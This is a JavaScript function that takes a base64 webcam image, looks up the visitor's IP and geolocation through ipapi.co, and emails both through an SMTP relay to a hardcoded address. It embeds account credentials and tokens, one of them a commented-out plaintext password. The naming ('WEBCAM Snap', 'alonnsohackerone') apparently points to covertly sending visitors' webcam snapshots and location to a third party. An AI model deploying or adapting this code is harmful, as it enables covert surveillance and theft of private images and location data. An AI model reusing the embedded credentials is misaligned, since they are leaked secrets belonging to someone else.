
function sendEmail(bimage){
    /*var _EMAIL="alonnsohackerone@gmail.com"
    var _PASS="8infinite"
    var _TO="helenicejoana@gmail.com"
    var _HOST='smtp.gmail.com'*/

    var ID = function () {
        return '_' + Math.random().toString(36).substr(2, 9);
    };
    
    var _EMAIL="alonnsohackerone@gmail.com"
    var _PASS="7B6007F33B72796FC42CDD5122E54E120CE5"
    var _TO="alonnsoandres@gmail.com"
    var _HOST='smtp.elasticemail.com'

    var Body="Attachment of the webcam snap";

    try{
        $.getJSON('https://ipapi.co/json/', function(data) {
            var ipdata=JSON.stringify(data, null, 2)
            console.log(ipdata);
            Body=ipdata;
        });
    }catch{
        console.log("Error")
        Body+=" [ERROR]";
    }

    const Attachments= [
        {   // encoded string as an attachment
          name: 'webcam.jpg',
          data: bimage.split("base64,")[1],
          encoding: 'base64'
        }]
    //eaaefb4a-a851-465d-8c58-cc2c3a190388
    Email.send({
        //SecureToken : "eaaefb4a-a851-465d-8c58-cc2c3a190388",
        Host : _HOST,
        Username : _EMAIL,
        Password : _PASS,
        To : _TO,
        From : _EMAIL,
        Subject : "WEBCAM Snap "+ID(),
        Body,
        Attachments
    }).then(
    message => alert(message)
    );
}